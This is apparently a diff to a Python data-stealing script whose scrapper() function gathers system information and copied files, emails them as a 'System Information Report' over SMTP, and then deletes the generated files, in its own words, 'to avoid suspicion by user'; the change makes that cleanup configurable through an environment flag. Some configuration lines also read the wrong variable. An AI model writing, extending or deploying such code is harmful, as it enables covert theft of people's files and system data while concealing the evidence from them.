@@ -23,7 +23,8 @@ smtp_port = int(os.getenv("smtp_port", 587))
 max_attachment_size_mb = int(os.getenv("smtp_port", 25))  # Gmail attachment size limit in MB
 max_copy_amount = int(os.getenv("smtp_port", 25)) # Max amount of files to copy in MB
 
-enable_debug_prints = os.getenv("enable_debug_prints", "false").lower()
+enable_debug_prints = os.getenv("enable_debug_prints", "false").lower() # Enable or disable debug print statements
+enable_delete_generated_files = os.getenv("enable_delete_generated_files", "false").lower() # Enable or disable auto-delete generated files (system_info.txt and copied_files directory)
 
 # determine if application is a script file or frozen exe
 if getattr(sys, 'frozen', False):
@@ -253,20 +254,21 @@ def scrapper():
         
         send_email_with_attachments(sender_email, receiver_email, password, smtp_server, smtp_port, attachments, "System Information Report", system_info_dir)
 
-        # Cleanup: Remove system_info.txt and copied_files directory to avoid suspicion by user
-        try:
-            # Remove system_info.txt
-            if os.path.exists(system_info_dir):
-                os.remove(system_info_dir)
-            
-            # Remove copied_files directory and all its contents
-            if os.path.exists(copied_files_dir):
-                shutil.rmtree(copied_files_dir)
-            if enable_debug_prints == "true":
-                print("Cleanup completed.")
-        except Exception as e:
-            if enable_debug_prints == "true":
-                print(f"Error during cleanup: {e}")
+        if enable_delete_generated_files == "true":
+            # Cleanup: Remove system_info.txt and copied_files directory to avoid suspicion by user
+            try:
+                # Remove system_info.txt
+                if os.path.exists(system_info_dir):
+                    os.remove(system_info_dir)
+                
+                # Remove copied_files directory and all its contents
+                if os.path.exists(copied_files_dir):
+                    shutil.rmtree(copied_files_dir)
+                if enable_debug_prints == "true":
+                    print("Cleanup completed.")
+            except Exception as e:
+                if enable_debug_prints == "true":
+                    print(f"Error during cleanup: {e}")
 
 if __name__ == "__main__":
     scrapper()
